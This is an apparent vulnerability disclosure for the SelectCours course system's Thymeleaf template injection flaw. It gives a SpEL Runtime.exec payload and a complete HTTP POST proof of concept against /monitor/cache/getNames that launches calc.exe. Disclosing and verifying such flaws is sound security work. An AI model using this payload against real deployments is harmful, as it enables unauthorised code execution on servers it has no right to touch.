# SelectCours-_Sever-side-Template-injection  
There is a serious vulnerability in the SelectCours  system. The Server Side Template Injection vulnerability may lead to sensitive information leakage, code execution, GetShell, and other issues.  
system URL:  
https://gitee.com/rahman/select-cours  
https://github.com/qinghongyou/selectcourse  
From the pom.xml file in the system, it can be found that the system is using a lower version of thymeleaf.  
![image](https://github.com/Andriesces/SelectCours-_Sever-side-Template-injection/assets/139127885/84aa5890-6904-4678-8c60-292a41a27b8e)  
And found that the return is controllable in the/getNames interface.Therefore, there is a thymeleaf template injection vulnerability in the system.  
![image](https://github.com/Andriesces/SelectCours-_Sever-side-Template-injection/assets/139127885/a6d346b9-c302-46af-8a0b-f45a9cf03552)  
Find the function point in the front-end page to capture and modify data.  
![image](https://github.com/Andriesces/SelectCours-_Sever-side-Template-injection/assets/139127885/3a4fc8e7-85da-4413-864a-3a51b1ff0e21)  
payload:${T     (java.lang.Runtime).getRuntime().exec("calc.exe")}    
POC:  
POST /monitor/cache/getNames HTTP/1.1  
Host: 127.0.0.1:8899  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0  
Accept: */*  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 67  
Origin: http://127.0.0.1:8899  
Connection: close  
Referer: http://127.0.0.1:8899/monitor/cache  
Cookie: JSESSIONID=244ca31b-26cc-45cc-af03-cbda23de6f29  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-origin  

fragment=${T     (java.lang.Runtime).getRuntime().exec("calc.exe")}  


When clicking to send a data packet, malicious code will be executed to start the computer.
![image](https://github.com/Andriesces/SelectCours-_Sever-side-Template-injection/assets/139127885/19ac3c89-80c8-4c80-a44c-8805e346078f)  
![image](https://github.com/Andriesces/SelectCours-_Sever-side-Template-injection/assets/139127885/85e85737-4804-4fe8-93bc-5519968d7524)  
Successful vulnerability verification








